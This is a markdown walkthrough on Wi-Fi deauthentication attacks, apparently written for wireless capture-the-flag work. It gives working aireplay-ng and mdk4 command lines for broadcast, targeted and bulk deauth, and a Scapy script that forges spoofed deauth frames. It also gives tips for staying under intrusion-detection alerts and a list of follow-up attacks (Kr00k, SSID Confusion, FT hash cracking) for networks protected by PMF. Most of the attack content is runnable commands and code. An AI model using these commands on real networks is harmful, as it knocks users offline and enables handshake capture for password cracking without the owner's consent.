# Deauth — walkthrough

**Verified against:** aircrack-ng 1.7 + mdk4 1.6 as of 2026-Q3

Three flavors. Broadcast is loud and blocked by PMF; targeted is quiet
and works against non-PMF clients on a PMF-required AP (transition
mode); crafted-scapy is the fallback when the tool ergonomics fight you.

## Kill the userland network stack first

Every path below drives a monitor-mode interface. Stop
NetworkManager / wpa_supplicant / iwd before you touch the radio,
otherwise the daemons keep retuning the interface out from under you
and injected frames vanish:

```
# 1. Stop NetworkManager / wpa_supplicant / iwd before entering monitor mode.
sudo airmon-ng check kill
# or explicitly:
sudo systemctl stop NetworkManager wpa_supplicant iwd
```

Re-run after any `nmcli` / `iwctl` / GUI toggle puts them back on
the radio. This preamble is canonical — the pcap and hcx-tools
walkthroughs link back here rather than repeat it.

## Path A — Broadcast (works on legacy / unprotected)

```
# All clients on the AP, 10 rounds.
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan1mon
```

- Reason code: version-dependent. aircrack-ng ≤ 1.6 defaulted to
  `7` (Class 3 frame from nonassociated STA); 1.7+ defaults to `1`
  (unspecified). Pin your build (`aireplay-ng --help | head -1`) or
  set the code explicitly with `--deauth <code>` (aliases: `-r`).
- Blocked by PMF-required.
- Trips loud WIDS signatures instantly.

## Path B — Targeted (works against non-PMF clients)

The stealthier version. Send only to a specific client's MAC.

```
aireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan1mon
```

- Still triggers a WIDS with per-STA-rate alerts, but low volume.
- Works even on PMF-required APs if the specific *client* opted out
  of PMF (allowed in transition mode).

## Path C — Scapy crafted

When you need control — different reason codes, spoofed BSSIDs, exotic
frame construction.

```python
from scapy.all import *

dot11 = Dot11(
    type=0, subtype=12,             # mgmt, deauth
    addr1="11:22:33:44:55:66",      # target STA
    addr2="AA:BB:CC:DD:EE:FF",      # spoofed AP
    addr3="AA:BB:CC:DD:EE:FF",      # BSSID
) / Dot11Deauth(reason=7)

# Send from a monitor+inject iface
for _ in range(5):
    sendp(RadioTap()/dot11, iface="wlan1mon", verbose=False)
```

Reason 15 (4-way handshake timeout) is sometimes more effective — some
supplicants restart the whole association on 15 but only retransmit
M-of-4 on 7.

## Path D — mdk4 modes (bulk DoS)

```
mdk4 wlan1mon d -B AA:BB:CC:DD:EE:FF          # deauth
mdk4 wlan1mon d -c 6 -B AA:BB:CC:DD:EE:FF     # channel-locked
mdk4 wlan1mon d -w /root/whitelist.txt        # deauth everyone except whitelist
```

## PMF interaction — what actually gets through

| AP posture              | Broadcast deauth | Targeted deauth (non-PMF client) | Targeted deauth (PMF client) |
| ----------------------- | ---------------- | -------------------------------- | ---------------------------- |
| PMF-disabled            | works            | works                            | n/a                          |
| PMF-optional (MFPC=1)   | works            | works                            | dropped                      |
| PMF-required (MFPR=1)   | dropped          | works (transition mode client)   | dropped                      |

The "works even on PMF-required" case is critical for WCTF: a
transition-mode AP with a mix of PMF and non-PMF clients still leaks
handshakes for the non-PMF clients.

## What if deauth doesn't fire?

- Confirm you're actually on the AP's channel. Deauth from a
  different channel is a common mistake.
- Confirm your radio is in monitor+inject mode: `iw dev wlan1mon info`
  should show `type monitor`.
- Confirm injection works: `aireplay-ng --test wlan1mon`.
- Confirm reason code isn't being silently mangled by a firmware bug
  (some Atheros firmwares mangle Dot11Deauth reason > 66).

## Failure modes

- **AP is PMF-required + all clients are PMF-capable.** Deauth is
  dead. Pivot to Kr00k trigger (disassoc still fires the tail-frame
  leak on Broadcom/Cypress), SSID Confusion, or wait for a natural
  reassoc.
- **WIDS alarms.** Broadcast deauth generates one alert per
  deauthed STA. Cut to targeted. Don't spam.
- **Client reconnects to another AP.** Deauth pushes them off; if
  they roam to a neighbor rather than reassoc to the same AP, you
  see the wrong handshake. Set your rogue up first.

## What still works when PMF-required

Broadcast deauth is a no-op against MFPR-required peers, and 6 GHz
mandates PMF end-to-end. The corpus above is written 80% for
PMF-off/optional; here is the fallback ladder when you can't force
a deauth:

- **SA Query race.** An unprotected disassoc still triggers a 1 s
  SA Query window at the STA (§11.3.5.4). A spoofed SA Query
  Response times the STA out legitimately. Narrow but real —
  requires precise timing and channel presence.
- **Natural roam wait.** Sit on-channel and wait for the STA to
  roam or re-associate. The 4-way / FT reassoc capture that
  results is indistinguishable from an attacker-triggered one.
  Slower, but reliable and near-zero WIDS surface.
- **Kr00k tail-frame decrypt (CVE-2019-15126 / CVE-2020-3702).**
  Vulnerable Broadcom/Cypress/QCA chipsets encrypt post-disassoc
  queued frames with a zero PTK. PMF stops the *attacker* from
  disassociating, but a natural disassoc still leaks the tail.
  Wait for one and grab it.
- **SSID Confusion (CVE-2023-52424).** The SSID field is not
  authenticated in the 4-way; the client's own auto-reconnect
  logic shifts onto a same-PSK sibling SSID without any deauth.
  See `ssid-confusion/walkthrough.md`.
- **MC-MitM (Vanhoef 2018).** Dual-channel interposition operates
  below the PMF layer — PMF only protects management frames, not
  the multi-channel data-frame primitive.
- **FT reassoc capture (802.11r).** FT reassoc frames are
  PMF-protected in transit, but the FT key material (PMK-R1
  distribution + reassoc IEs) still yields a hashcat-22000 hash
  when captured — offline crack, no live deauth needed.
- **Framing Frames (CVE-2022-47522).** The power-save queue-
  poisoning primitive relies on unprotected TIM / PS-Poll control
  frames, which PMF does not cover.

## Cite

- IEEE Std 802.11-2020, §9.3.3.13, §9.4.1.7, §11.3.5.4 (SA Query),
  §11.34 (PMF).
- aircrack-ng documentation — aireplay-ng.
- mdk4 documentation.
- Vanhoef 2018 (MC-MitM); Gollier & Vanhoef 2024 (SSID Confusion,
  CVE-2023-52424); ESET 2019 (Kr00k, CVE-2019-15126 + CVE-2020-3702);
  Vanhoef 2022 (Framing Frames, CVE-2022-47522).
- attacks.json: `deauth-targeted`, `deauth-broadcast`,
  `disassoc-targeted`, `sa-query-race`,
  `kr00k-broadcom-cve-2019-15126`,
  `ssid-confusion-cve-2023-52424`,
  `framing-frames-cve-2022-47522`.
